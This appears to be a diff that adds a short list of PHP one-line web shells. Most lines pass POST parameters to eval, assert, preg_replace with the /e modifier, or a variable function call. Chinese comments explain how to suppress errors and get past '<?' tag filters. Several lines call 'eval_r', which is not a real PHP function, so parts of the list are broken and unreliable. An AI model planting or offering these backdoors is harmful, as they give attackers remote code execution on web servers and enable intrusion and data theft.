@@ -1,0 +1,12 @@
+<?php eval(@$_POST['a']); ?>
+<?php assert(@$_POST['a']); ?>
+<?php eval_r($_POST['a'])?>
+<?php @eval_r($_POST['a'])?>//加@忽略报错
+<?php assert($_POST['a']);?>
+<?$_POST['a']($_POST['b']);?>
+<?$_POST['a']($_POST['b'],$_POST['c'])?>
+<?php
+@preg_replace("/[email]/e",$_POST['h'],"error");
+?>
+<O>h=@eval_r($_POST1);</O>
+<script language="php">@eval_r($_POST['a'])</script>//绕过<?限制
